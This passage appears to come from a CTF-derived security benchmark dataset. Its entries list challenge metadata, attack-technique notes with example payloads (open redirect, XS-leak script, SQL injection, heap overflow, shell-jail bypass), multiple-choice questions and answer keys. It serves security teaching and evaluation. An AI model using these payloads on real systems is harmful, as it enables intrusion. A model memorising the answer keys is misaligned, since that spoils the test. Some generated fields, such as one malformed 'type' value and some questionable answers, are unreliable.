            "Exploiting OAuth vulnerabilities can be an indirect method to bypass authentication or authorization mechanisms. By intercepting the OAuth token and verifier after an admin or a user initiates an OAuth sequence, an attacker can forge a request that appears as coming from the authorized user, gaining access or performing actions restricted to that user. This method requires knowledge of how the application handles OAuth callbacks and may involve capturing or generating OAuth tokens through interaction with the OAuth provider's flow, then using these captured details in crafted requests to simulate a legitimate OAuth authorized action.  \nExample payload: Cannot be provided due to variability in OAuth implementations and the need for real-time interaction or token interception, which generally requires tools like Burp Suite for request manipulation and interception."
        ],
        "question": [
            "When bypassing CSRF protection by dynamically loading the CSRF token from an external script, which technique is NOT effective in overcoming same-origin policy restrictions? - A. Injecting a script tag referencing the external CSRF token script. - B. Modifying the HTTP referer header to mimic a request coming from the target domain. - C. Using the `document.domain` property to mimic the target domain after loading the CSRF token script. - D. Directly overwriting the `document.domain` property without loading the CSRF token script first.",
            "In the context of exploiting OAuth vulnerabilities for unauthorized access, what is NOT a required step for leveraging OAuth tokens obtained through interception? - A. Generating new OAuth tokens by interacting with the OAuth provider's authentication flow. - B. Sending a forged request that contains the intercepted OAuth tokens to the vulnerable application. - C. Capturing the OAuth token and verifier by intercepting the communication between the client and the OAuth provider. - D. Using the captured OAuth tokens to directly access the OAuth provider's resources without involving the vulnerable application."
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "Your Note",
        "write_up": "dataset/raw/Your Note.md",
        "type": "web",
        "competition": [
            "LINE/2021",
            "https://ctftime.org/event/1269/tasks/"
        ],
        "score": 50,
        "max_score": 499,
        "difficulty": 0.10020040080160321,
        "knowledge": [
            "When facing a web challenge that involves redirects, pay attention to how the URL is constructed and validated. Manipulating URL parameters and exploiting the behavior of URL interpretation in browsers can lead to open redirect vulnerabilities. This can be achieved by inserting control characters or specific structures such as `@` to alter the intended path, leading to arbitrary URL redirection. \n    - Example of manipulating URL for open redirect vulnerability: Sending `http://34.84.72.167/[email\u00a0protected]` to an application can make it redirect to `http://{APP_HOST}@evil.example.com` if the application concatenates user input directly to a base URL without proper validation.",
            "For web challenges involving JavaScript interaction in a browser environment, if the challenge setup allows running custom JavaScript (e.g., via an XSS attack) and the browser sandbox is configured with options like `--disable-popup-blocking`, it's possible to exploit this setup for Cross-Site Scripting (XSS) or Cross-Site Leaks (XS-Leaks). Utilizing `window.open` and manipulating `window.opener.location` can facilitate an XS-leak attack to progressively leak information such as session tokens or CSRF tokens. This technique can be especially effective in environments where normal CORS policies are not strictly enforced, or popup blockers are disabled, allowing the attacker to open new windows and manipulate their locations to probe and extract sensitive information.\n    - Example payload for executing an XS-Leak attack:\n      ```html\n      <script>\n      const url = \"http://victim.com\";  \n      const chars = \"abcdef0123456789\";  \n      const sleep = (ms) => new Promise((r) => setTimeout(r, ms));\n\n      const main = async () => {    \n        await sleep(200);    \n        let secret = \"\";\n\n        for (const c of chars) {\n          window.opener.location.href = `${url}/fake-path?secret=${secret + c}`;  \n          await sleep(500);\n          // Assume logic to determine if the guessed character is correct\n        }    \n      };  \n      main();\n      </script>\n      ```\n    - This script attempts to guess a secret one character at a time by changing the `window.opener.location` and observing the effect, which could indicate correct or incorrect guesses based on ensuing side-effects observable from the attacker's context."
        ],
        "question": [
            "During a login process on a web application, a redirect to an arbitrary URL is crafted via manipulating the URL parameter `redirect`. Given the code snippet below, which of the following inputs is correctly formatted to exploit an open redirect vulnerability and send the user to `evil.example.com` after adding `@evil.example.com` to the base URL?  ```python @app.route('/login', methods=['GET', 'POST']) def login(): url = request.args.get('redirect') if url: url = app.config.get('BASE_URL') + url if current_user.is_authenticated: return redirect(url) ```  - A. Sending the input `http://apphost/[email\u00a0protected]` - B. Sending the input `redirect=//evil.example.com` - C. Sending the input `redirect=@evil.example.com` - D. Sending the input `redirect=http://34.84.72.167/[email\u00a0protected]` ",
            "Considering a web challenge where a JavaScript code snippet provided can open new windows and manipulate `window.opener.location`, which technique does the following JS script illustrate, particularly using `window.opener.location.href` to progressively manipulate or probe the browser's behavior?  ```javascript <script> const url = \"http://victim.com\"; const chars = \"abcdef0123456789\"; const sleep = (ms) => new Promise((r) => setTimeout(r, ms));  const main = async () => { await sleep(200); let secret = \"\";  for (const c of chars) { window.opener.location.href = `${url}/fake-path?secret=${secret + c}`; await sleep(500); // Logic to determine if the guessed character is correct } }; main(); </script> ```  - A. Executing a Cross-Site Scripting (XSS) attack by injecting malicious scripts. - B. Installing a Cross-Site Request Forgery (CSRF) token theft script. - C. Conducting an XS-leak attack to gradually leak sensitive information. - D. Deploying a Distributed Denial of Service (DDoS) attack using JavaScript. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Yummy Vegetables",
        "write_up": "dataset/raw/Yummy Vegetables.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": -1,
        "max_score": 550,
        "difficulty": -1,
        "knowledge": [
            "When identifying a potential SQL injection point within an application that accepts JSON data, testing for SQL injection can be executed by constructing custom HTTP requests that include SQL control characters or syntax. This technique is effective in environments or frameworks where raw SQL queries are constructed using string concatenation with user-supplied input. Example payload for testing SQL injection vulnerability: `{\"query\":\"%' OR '1'='1\"}`",
            "To enumerate the database schema (such as table names or column details) in an SQL injection scenario, especially when dealing with SQLite databases, a UNION SELECT injection can be utilized. This involves determining the number of columns in the original query using `ORDER BY` technique and then crafting a payload that uses `UNION SELECT` to extract meta-information (e.g., table names) from `sqlite_master`. This approach is applicable in scenarios where the attacker has determined that the query result structure can be manipulated and the database engine is SQLite. Example payload to enumerate database schema: `%' AND 1=0 UNION SELECT 1,name,3 FROM sqlite_master; --`"
        ],
        "question": [
            "In assessing the security of a web application, you've discovered a portion of the application that accepts JSON data for search queries through an HTTP request. Given the potential for SQL injection vulnerabilities in such scenarios, which of the following payloads would be most appropriate to test for SQL injection by attempting to alter the logical structure of the underlying SQL query? - A. `{\"query\":\"shutdown\"}` - B. `{\"query\":\"%' OR '1'='1\"}` - C. `{\"query\":\"DROP TABLE veggies;\"}` - D. `{\"query\":\"<script>alert('xss')</script>\"}`",
            "When trying to enumerate the schema of a SQLite database through an SQL injection vulnerability found in a web application, knowing the number of columns in the underlying SQL query is crucial. Assume you have confirmed that the vulnerable application uses a query structure like the one provided (`SELECT * FROM veggies WHERE name LIKE '%{user_input}%';`). Which SQL injection payload would be most effective in determining the number of columns used by the original query? - A. `%' UNION SELECT 1,2,3--` - B. `%' order by 1; --` - C. `%' AND EXISTS(SELECT * FROM sqlite_master); --` - D. `%' DROP TABLE sqlite_master; --`"
        ],
        "answer": [
            "B.",
            "B."
        ]
    },
    {
        "name": "Yunny It",
        "write_up": "dataset/raw/Yunny It.md",
        "type": "crypto",
        "competition": [
            "ASIS/2018/Quals",
            "https://ctftime.org/event/568/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a service leveraging AES encryption in CBC mode with an HMAC for integrity verification, an attacker can utilize known plaintext attacks if they can manipulate plaintext and observe encrypted outputs. This can be approached by encrypting controlled plaintext inputs where the plaintext incorporates part of the target data (e.g., a FLAG), and then analyzing the encrypted output to deduce information about the encrypted target data. This strategy is effective when the attacker can predetermine some parts of the plaintext, such as a known suffix or prefix that gets appended or prepended to the target data (FLAG) before encryption.\n   \n   Example approach: For ciphertext blocks that are known to encode only a part of the FLAG followed by attacker-controlled input, modify the input to influence the block cipher's output systematically. Observing how modifications to the input affect the encrypted output can reveal information about the encrypted FLAG piece by piece.",
            "In scenarios where direct access to the decryption routine is not provided or is heavily restricted, if an oracle exists that differentiates between correctly and incorrectly decrypted content (e.g., specific responses to particular decryption outcomes), this oracle can be exploited to perform chosen-ciphertext attacks. Specifically, by carefully crafting ciphertexts and observing the oracle's responses, one can deduce information about the plaintext, such as specific byte values. This technique is powerful in CBC mode if the service's response varies based on the content of decrypted messages, allowing for incremental revelation of plaintext data through byte-wise analysis and manipulation.\n\n   Example technique: Construct an encrypted payload where the last block contains only one unknown byte of the target data (e.g., the last byte of the FLAG). By varying the preceding block (which acts as the IV for the target block in CBC mode) and observing the oracle's responses, the attacker can deduce the value of the unknown byte. Repeat this process by crafting ciphertexts that position each byte of the target data at the last position of a block, systematically revealing the entire target data."
        ],
        "question": [
            "In an AES encryption scheme operating in CBC mode with HMAC for integrity, if an attacker is provided the ability to encrypt a suffix and a prefix around a secret data (e.g., FLAG), which kind of attack allows the attacker to gradually deduce information about the secret data by analyzing changes in the encrypted output when varying the controlled input?  - A. Man-in-the-middle attack - B. Differential cryptanalysis - C. Known plaintext attack - D. Side-channel attack ",
            "Within a context where an application provides different responses based on the decryption success or content integrity of an encrypted message, what kind of attack might exploit this behavior by observing the application's responses to crafted ciphertexts to infer details about the plaintext in a CBC mode encryption scheme?  - A. Replay attack - B. Chosen-ciphertext attack - C. Rainbow table attack - D. SQL injection attack "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Zeh",
        "write_up": "dataset/raw/Zeh.md",
        "type": "reverse",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 100,
        "max_score": 1337,
        "difficulty": 0.07479431563201197,
        "knowledge": [
            "In challenges involving manipulation of an integer's value through operations like bit shifting and XOR to achieve a specific result, symbolic execution engines like angr can be effectively used to automate the discovery of inputs that produce the desired outcome. This approach is particularly useful in scenarios where the program logic includes deterministic, albeit complex, transformations that need to be inverted or precisely matched.",
            "When dealing with programs that do not set a seed for random number generation functions such as `rand()`, these programs will produce a consistent, repeatable output on each execution. This property can be leveraged in challenges to predict or reproduce program behavior, facilitating the construction or analysis of attacks and solutions based on the predictable aspects of the program's execution flow."
        ],
        "question": [
            "In a CTF challenge, the goal is to manipulate two integer inputs so that after specific transformations, including a loop with bitwise shifts and an XOR operation, one of the integers reaches a target value. Given the loop's deterministic nature and the complexity of the operations, which approach is recommended to automate the discovery of the correct inputs?  - A. Hard-code potential values until the correct ones are found. - B. Use a brute-force algorithm, trying every possible combination of inputs. - C. Utilize a symbolic execution engine like angr to systematically explore possible inputs and find the ones that meet the criteria. - D. Perform manual calculations to reverse-engineer the correct inputs based on the target value. ",
            "In the scenario where a program's random number generation does not utilize a seed, resulting in the function 'rand()' always returning the same value upon each execution, how can this characteristic be utilized in security analysis or reverse engineering efforts?  - A. Ignore the 'rand()' function as it introduces unnecessary complexity. - B. Dynamically analyze the program while changing the system clock to influence 'rand()' outputs. - C. Predict the output of the 'rand()' function to aid in constructing attacks or understanding the program's behavior. - D. Replace the 'rand()' function with a cryptographically secure pseudorandom number generator for enhanced security. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "zer0mi",
        "write_up": "dataset/raw/zer0mi.md",
        "type": "crypto",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 611,
        "max_score": 1000,
        "difficulty": 0.611,
        "knowledge": [
            "For challenges involving encryption schemes based on linear algebra and Galois Fields (GF), specifically the Matsumoto-Imai cryptosystem, the attack approach involves finding a vector space of matrices that satisfy certain polynomial equations derived from the encryption's public key and ciphertext. By converting the Galois Field elements and system equations to a format that can be handled by computer algebra systems or custom scripts, it is possible to manipulate these equations to reveal the system's private key or directly obtain the plaintext.\n    - **Condition:** This approach is applicable when dealing with encryption schemes that can be described by polynomials over a Galois Field, particularly when the public key and ciphertext can be represented by these polynomial equations.\n    - **Knowledge:** Translate the provided public key and ciphertext into a system of polynomial equations over a Galois Field. Then find the vector space satisfying these equations to either reveal the private key or decrypt the ciphertext directly.",
            "When dealing with complex mathematical encryption challenges, utilize high-level language features for rapid prototyping (e.g., Python for preliminary scripts) and switch to lower-level languages (e.g., C++) for implementing the final solver to benefit from speed optimizations. During the decryption process, pre-calculate operations (such as Galois Field multiplications) and store them in constant arrays for quick lookup to increase the efficiency of the solver.\n    - **Condition:** Effective when solving CTF challenges that require manipulating algebraic structures such as Galois Fields, where performance can be critical due to the computational complexity of the attacks.\n    - **Knowledge:** Leverage the strengths of different programming languages according to the phase of solution development: use high-level languages for concept validation and prototyping, and low-level languages for efficient execution. Pre-calculate and store repetitive operations to optimize performance.\n\n**Sample Payload Generation Guidance:** Unfortunately, generating a specific payload or code snippet without the complete context of the Galois Field operations and the specific challenge setup is unfeasible. However, the principle of translating algebraic operations into code and pre-calculating repetitive mathematical operations can be universally applied across similar challenges."
        ],
        "question": [
            "In the context of deciphering ciphertext encrypted with a Matsumoto-Imai cryptosystem-based encryption scheme, which approach is necessary for breaking the encryption?  - A. Randomly guessing the private key until a match is found. - B. Using a brute-force approach to try every possible plaintext combination. - C. Finding a vector space of matrices that satisfy certain polynomial equations derived from the encryption's public key and ciphertext. - D. Decrypting the ciphertext directly without analyzing the encryption scheme's mathematical properties. ",
            "When solving complex mathematical encryption challenges, such as those involving Galois Fields in a Capture The Flag (CTF) competition, which strategy optimizes the efficiency of your solution development and execution process?  - A. Solely using high-level programming languages throughout the entire process due to their ease of use and readability. - B. Leveraging the strengths of different programming languages: using high-level languages for prototyping and low-level languages for the final solver to benefit from speed optimizations, while pre-calculating repetitive operations. - C. Writing the entire solution in assembly language to maximize execution speed and efficiency. - D. Relying exclusively on theoretical mathematical analysis without implementing any actual code. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "ZERMATT",
        "write_up": "dataset/raw/ZERMATT.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": -1,
        "max_score": 320,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges involving obfuscated scripts, various deobfuscation techniques can be applied for clarity. One common method is to decode encoded strings using functions contained within the script itself. Once identified, these functions can be reused to decrypt the encoded strings into readable text. Additionally, cleaning up the code by removing unnecessary obstructions such as convoluted logic flows or obfuscated numeric literals can significantly improve readability, aiding in understanding the script's functionality.",
            "When dealing with custom encryption or encoding within scripts, identifying and understanding the encryption or encoding routine is crucial. Often, the key to solving the challenge lies in reverse engineering these routines to decrypt or decode the concealed information. In scenarios where the routine involves simple operations such as XOR, writing custom scripts in a more familiar or versatile programming language (e.g., Python) to replicate the decryption process can be an effective strategy to retrieve hidden messages or flags. \n\nExample Python decryption payload for simple XOR encryption:\n```python\nflag_encrypted = bytearray.fromhex(\"ENCRYPTED_FLAG_HEX\")\nkey = bytearray.fromhex(\"KEY_HEX\")\n\ndecrypted_flag = \"\".join([chr(c ^ key[i % len(key)]) for i, c in enumerate(flag_encrypted)])\nprint(decrypted_flag)\n```"
        ],
        "question": [
            "When trying to deobfuscate a Lua script containing encoded strings like the following:  ```lua local v8 = _G[v7(\"\\79\\15\\131\\30\\40\\13\\20\\203\",\"\\59\\96\\237\\107\\69\\111\\113\\185\")]; ``` and a function defined to decode these strings: ```lua local function concatString(part1, part2) local result = {}; for i = 1, #part1 do table.insert(result, string.char(bit32.bxor(string.byte(string.sub(part1, i, i + 1)), string.byte(string.sub(part2, 1 + ((i - 1) % #part2), 1 + ((i - 1) % #part2) + 1))) % 256)); end return table.concat(result); end ``` what is the purpose of the `concatString` function as used in this scenario?  - A. To append two strings together without any modifications. - B. To encode strings using Base64 encoding scheme. - C. To decode previously obfuscated strings using XOR and concatenation. - D. To perform mathematical operations on string characters. ",
            "Given a snippet of a script that decrypts an encrypted message using a simple XOR operation like shown below: ```lua local function decryptMessage(encryptedMessage, key) local decryptedMessage = {}; for i = 1, #encryptedMessage do local encryptedChar = string.byte(encryptedMessage:sub(i, i)); local keyChar = string.byte(key:sub((i - 1) % #key + 1, (i - 1) % #key + 1)); table.insert(decryptedMessage, string.char(bit32.bxor(encryptedChar, keyChar))); end return table.concat(decryptedMessage); end ``` Which Python code snippet correctly replicates the decryption function described above for an XOR-based encryption scheme?  - A. `decrypted_flag = \"\".join([c ^ key[i % len(key)] for i, c in enumerate(flag_encrypted)])` - B. `decrypted_flag = \"\".join([chr(c + key[i % len(key)]) for i, c in enumerate(flag_encrypted)])` - C. `decrypted_flag = \"\".join([chr(c ^ key[i] % len(key)) for i, c in enumerate(flag_encrypted)])` - D. `decrypted_flag = \"\".join([chr(c ^ key[i % len(key)]) for i, c in enumerate(flag_encrypted)])` "
        ],
        "answer": [
            "C. To decode previously obfuscated strings using XOR and concatenation.",
            "D. `decrypted_flag = \"\".join([chr(c ^ key[i % len(key)]) for i, c in enumerate(flag_encrypted)])`"
        ]
    },
    {
        "name": "ZigZag",
        "write_up": "dataset/raw/ZigZag.md",
        "type": "pwn",
        "competition": [
            "SPbCTF/2020/Quals",
            "https://ctftime.org/event/1188/tasks/"
        ],
        "score": 460,
        "max_score": 500,
        "difficulty": 0.92,
        "knowledge": [
            "To analyze and understand the behavior of a complex cipher such as a permutation cipher, one effective strategy is to automate the process by writing scripts that submit texts with characters in various positions to the cipher service. These scripts help identify where each character is moved in the ciphertext, based on the response. This approach is particularly useful when dealing with multiple variations of a cipher that operates differently based on the input length.\n- Example strategy: Create a Python script that loops through different positions of the alphabet in the input text, submits each version to the cipher service, and notes the position changes in the output. Adjust the script's padding and submission mechanics according to the expected input length variations of the cipher to map out its behavior efficiently.",
            "When exploiting a heap-based vulnerability, specifically in the context of a challenge where an inappropriate size check in an edit function allows for an overflow, one can achieve an arbitrary read/write primitive. This is accomplished by overwriting metadata such as the `.page` and `.alloc_cursor` fields of a structure like `BucketHeader`. This strategy could be employed to manipulate the application's memory allocation behavior, redirecting it to a controlled or interesting area of memory. This technique requires a deep understanding of the target application's memory allocation mechanisms and careful planning to ensure the overwrite leads to a beneficial outcome without crashing the application.\n- Example technique: Craft an overflow payload that nulls out the `.alloc_cursor` and `.used_count` while setting `.page` to point at a targeted memory location. This manipulation enables the next allocation to return a pointer to the specified location, granting control over what is read from or written to that area."
        ],
        "question": [
            "When writing a script to analyze variations of a permutation cipher based on different lengths of input, what is an essential consideration to handle the input length? - A. Adjust script padding to meet specific length requirements for different cipher variations - B. Use a fixed input length regardless of the cipher's requirements - C. Ignore input length and focus solely on output patterns - D. Encrypt the input before sending it to the service to analyze the cipher's behavior",
            "In exploiting a heap-based vulnerability that allows for arbitrary read/write via overflow, which structure field manipulation is critical for redirecting memory allocation behavior to a controlled area? - A. Manipulate the `.size` field to increase allocation size arbitrarily - B. Overwrite the `.page` and `.alloc_cursor` fields of a `BucketHeader` to point to a targeted memory location - C. Adjust the `.len` property of input data to avoid detection - D. Change the `.flags` field to enable additional permissions"
        ],
        "answer": [
            "A. Adjust script padding to meet specific length requirements for different cipher variations",
            "B. Overwrite the `.page` and `.alloc_cursor` fields of a `BucketHeader` to point to a targeted memory location"
        ]
    },
    {
        "name": "Zip-Madness",
        "write_up": "dataset/raw/Zip-Madness.md",
        "type": "misc",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 175,
        "max_score": 800,
        "difficulty": 0.21875,
        "knowledge": [
            "When facing a challenge that involves sequentially accessing many files or directories based on the contents of a previously accessed file (in this scenario, zip files named numerically and requiring to choose a path based on the contents of a direction.txt file), automate the process using a script. Bash script can be used effectively for tasks involving unzipping files, reading from files, and iterating over a set of actions. An example script for such a scenario involves initializing the process by unzipping the first file, then entering a loop where the script reads the necessary direction from a file (`direction.txt` in this case) and uses it to determine the next file to unzip, continuing this process until the final file is reached.\n   Example bash script snippet: \n   ```\n   #!/bin/bash\n   unzip flag.zip  \n   for ((i=1000; i>=1; i--))  \n   do  \n       read -r direction < direction.txt  \n       unzip -o \"${i}${direction}.zip\"  \n   done  \n   ```",
            "In scenarios where iterative file manipulations are required, such as unzipping a large number of zip files in a certain order, the use of command-line options to automate repetitive prompts (like confirmation to overwrite files) can significantly streamline the process. The `-o` option with the `unzip` command in a bash script, for instance, allows for the automatic overwriting of files without manual confirmation. This approach is beneficial in reducing the manual workload and ensuring a smooth execution of the script.\n    Example usage of `-o` in the command: \n    ```\n    unzip -o \"$direct$side.zip\"\n    ```"
        ],
        "question": [
            "When creating a Bash script to automate unzipping a sequence of zip files based on directions contained within a text file, which loop construct is utilized to perform actions from a higher number down to 1? - A. for ((i=1; i<=1000; i++)) - B. while read -r direction < direction.txt - C. for ((direct=1000; direct>=1; direct--)) - D. do read -r side < direction.txt",
            "In a Bash script, which option used with the `unzip` command enables automatic overwriting of existing files without prompting for confirmation during the unzipping process of multiple files? - A. unzip -u \"$file.zip\" - B. unzip -o \"$file.zip\" - C. unzip -y \"$file.zip\" - D. unzip -a \"$file.zip\""
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "zipzipzipzip 100",
        "write_up": "dataset/raw/zipzipzipzip 100.md",
        "type": "pwn",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing hidden content within PDF files, two approaches can significantly aid the discovery of concealed data. First, visually inspect the document for anomalies such as overlaid or hidden objects by interacting with the document, for instance, by moving images or elements around if the viewer allows. This method can reveal parts of a flag or other hidden messages. Second, directly inspect the PDF's source code or content by opening it with a text editor. Searching for anomalies or encoded data (e.g., Base64 strings) within the file can unearth embedded secrets or parts of a CTF challenge flag that are not visibly apparent when viewing the document in a standard PDF viewer.\n   \n    Example for finding Base64 encoded data: `/Creator (Base64_encoded_string)`",
            "Handling nested zip files in CTF challenges, especially those requiring password extraction and application at each level, can be efficiently approached with automation scripts. A Python script can be utilized to automate the process of sequentially opening each zip file using a password retrieved from a text file, extract the content, and then delete the processed zip file. This method is particularly effective in challenges where manual extraction is impractical due to the sheer number of nested archives.\n\n    Example for automating the extraction and deletion of nested zip files:\n    ```python\n    import os\n\n    zip_number = 25000  \n    cmd1 = \"find . -name '*.zip' -exec unzip -o -P \"  \n    cmd2 = \" {} \\; -exec rm {} \\;\"\n\n    file = open(\"password.txt\", \"r\")  \n    pswd = file.read().strip()  \n    file.close()\n\n    for i in range(1, zip_number):  \n        os.system(cmd1 + pswd + cmd2)  \n\n        file = open(\"password.txt\", \"r\")  \n        pswd = file.read().strip()  \n        file.close()  \n    ```"
        ],
        "question": [
            "When attempting to discover hidden elements in PDF documents for CTF challenges, which method is effective for uncovering hidden text or content? - A. Changing the document's extension to .txt and reading the metadata. - B. Using a PDF viewer's edit mode to move images or elements around and reveal overlaid objects. - C. Converting the PDF to an image format (e.g., .jpg, .png) to visually inspect hidden contents. - D. Performing a standard text search within the PDF for common CTF flag formats (e.g., flag{...}).",
            "In a CTF challenge with nested zip files each protected by passwords contained in a separate text file, which approach is most efficient for extracting the nested content? - A. Manually extracting each zip file using the provided passwords. - B. Writing a shell script to extract each zip file without removing the extracted files. - C. Using a Python script to automate the extraction and deletion of each zip file after its content is extracted, iterating over the process until all files are unpacked. - D. Employing a zip file repair tool to bypass the need for passwords and extract all files simultaneously."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Znfl",
        "write_up": "dataset/raw/Znfl.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing binary files that seem to employ randomness in their operations, one effective approach to understanding their behavior is to override functions like `rand()` that generate this randomness. This can be achieved using the `LD_PRELOAD` mechanism to intercept and replace random values with fixed ones, providing a controlled environment for further analysis. This technique is especially useful when the output or behavior of a binary is inconsistent across different executions due to its reliance on random values.\n   - Example payload in C for overriding `rand()` function:\n     ```C\n     int rand() {\n       return 0;\n     }\n     ```\n     Compile with: `gcc -shared -fPIC -o libunrandom.so unrandom.c`",
            "In the scenario where a binary's output is based on its input and employs a deterministic mapping (potentially altered by an unknown key), a combination of brute force and dictionary attack can be applied. First, understand how input affects output (e.g., every two characters mapped to four numbers). Then, create a mapping dictionary by sending all possible inputs and recording their outputs. Lastly, if the output has been manipulated (e.g., via XOR with a key), deduce the key using known inputs and outputs, and apply the inverse operation to recover the original input values from an encrypted output.\n   - Example Python snippet to create and use a mapping dictionary:\n     ```python\n     dic = {}\n     for first in range(0x21, 0x7F):\n         for second in range(0x21, 0x7F):\n             # Send input and capture output logic here\n             dic[(output_a, output_b, output_c, output_d)] = (first, second)\n     # Use dic for reverse mapping to recover inputs\n     ```"
        ],
        "question": [
            "In a given binary analysis scenario, how can an analyst effectively stabilize random behaviors for consistent analysis results using `rand()` interception? - A. Override `rand()` to return a random value each time. - B. Modify the binary directly to remove all calls to `rand()`. - C. Use `LD_PRELOAD` to preload a custom library that overrides `rand()` to return a fixed value, such as 0. - D. Use a debugger to step through each `rand()` call manually and set the return value. ",
            "When faced with a binary that maps two input characters to four output numbers and employs an unknown operation to alter the mapping, which approach aids in decrypting outputs to recover original inputs? - A. Apply a simple frequency analysis on the output numbers without considering input mapping. - B. Override system time functions to the same timestamp to ensure consistent outputs for analysis. - C. Construct a dictionary by brute-forcing all possible two-character inputs and recording their four-number outputs, then reverse the unknown operation to decrypt outputs. - D. Encrypt the inputs using common cryptographic algorithms and compare them to the output to find patterns. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "zoom_zoom_vision",
        "write_up": "dataset/raw/zoom_zoom_vision.md",
        "type": "reverse",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 482,
        "max_score": 500,
        "difficulty": 0.964,
        "knowledge": [
            "In challenges involving C++ compiled executables, running the executable and observing its behavior, such as processing input or error messages, can provide clues about the binary's functionality even before applying reverse engineering tools. By executing the binary with different inputs and analyzing the output, patterns or encryption methods (like substitution in this case) can be deduced. Example initial inputs and outputs to observe:  \n   - Input: `123`  \n   - Output: `784 800 816`  \n   - Input: `aaa`  \n   - Output: `1552 1552 1552`",
            "When encountering encrypted or encoded output from a binary, constructing a decoding map by providing known inputs and recording outputs allows for the creation of a reverse lookup table. This method is useful when the encryption or encoding appears to be a simple substitution cipher. The process involves running the program with a full character set, parsing these outputs to build the map, and then applying this map to decode any provided encrypted sequences or to decode hidden messages within the binary.\n   - No direct example payload given due to the customized nature of the decoding map, but the approach involves systematic input testing (`a-z`, `0-9`, etc.) and mapping observed outputs to these inputs."
        ],
        "question": [
            "When analyzing a C++ compiled executable for its behavior without using reverse engineering tools, what is a valid method to understand its functionality based on the description given?  - A. Recompiling the code with debugging symbols to see the function names. - B. Decompiling the executable and analyzing the pseudo-code. - C. Sending different inputs and observing the outputs to identify patterns or encryption methods. - D. Using a network sniffer to see if the executable communicates over the network. ",
            "In the context of analyzing encrypted or encoded outputs from a binary, what step is crucial for creating a reverse lookup table to decode hidden messages?  - A. Encrypting known plaintexts with the same algorithm and comparing it to the binary's output. - B. Running the program with a full character set, recording these outputs, and mapping them to the inputs. - C. Applying advanced cryptographic analysis to break the binary's encryption algorithm. - D. Reverse engineering the binary to directly retrieve the encryption keys or methods. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "zshfuck",
        "write_up": "dataset/raw/zshfuck.md",
        "type": "misc",
        "competition": [
            "DiceCTF/2024/Quals",
            "https://ctftime.org/event/2217/tasks/"
        ],
        "score": 127,
        "max_score": 281,
        "difficulty": 0.45195729537366547,
        "knowledge": [
            "In scenarios where the input characters are severely limited, such as a zsh jail that allows only a specific set of characters and limits the length of input, utilizing wildcard characters effectively allows for operations that deeply navigate or perform actions beyond these limitations. For instance, the wildcard `[!x]` can act as a substitute for other characters that are not allowed, expanding the options for commands or paths that can be executed. This technique can be particularly useful in bypassing restrictions to execute files or traverse directories.\n   \n   Example payload to navigate directories: `./[!.][!.][!.]/[!.][!.][!.][!.]/[!.][!.][!.][!.][!.][!.][!.][!.][!.]/[!.][!.][!.][!.]/[!.][!.][!.][!.][!.][!.][!.]`",
            "The command `ls -R` can be leveraged in situations where manual navigation through file systems is constrained either by input limitations or knowledge of the file structure. Its recursive listing functionality provides a comprehensive outline of all files and directories underneath the current directory, which is valuable for uncovering paths or files of interest that might not be immediately visible or accessible due to the environment constraints (e.g., a restricted shell or a jail).\n\n   Example command to reveal directory structure: `ls -R`"
        ],
        "question": [
            "In a restricted shell environment where only a specific set of characters is permitted and input length is constrained, how can the wildcard `[!x]` be used effectively to navigate directories or execute commands? - A. It replaces specific restricted characters, enabling direct command execution without workarounds. - B. It serves as a wildcard for any character not specified, allowing for dynamic directory traversal or command execution. - C. It encrypts the input commands to bypass shell restrictions. - D. It is used to increase the allowed input length beyond the shell restriction. ",
            "When faced with the task of exploring a file system in a controlled or limited environment, such as a restricted shell, which command would allow for a comprehensive view of all files and directories starting from the current location? - A. `ls -a` to list all files, including hidden ones, in the current directory. - B. `find / -name '*'` to search all files and directories in the file system. - C. `ls -R` to recursively list all files and directories under the current directory. - D. `grep -r '.'` to search through the content of all files under the current directory. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "zzz",
        "write_up": "dataset/raw/zzz.md",
        "type": "The first part of the write-up describes a reverse challenge involving solving constraints using z3, while the second part involves solving z3 constraints as well. \n\nTherefore, the type of the challenge is **reverse**.",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving symbolic execution or constraint satisfaction, especially when analyzing binaries to find input values that lead to a specific program state (e.g., successful execution path), tools like angr can be leveraged to automate the process. To use angr effectively, one can define success and failure conditions by examining the program's output for specific success or failure messages, respectively. This approach allows for the automatic exploration of the program's state space to find inputs that satisfy all constraints leading to the desired state. Example angr script components include defining success and failure state checks (`is_successful`, `should_abort` functions), adding initial constraints for the known parts of the input, and using `explore` to find the solution.",
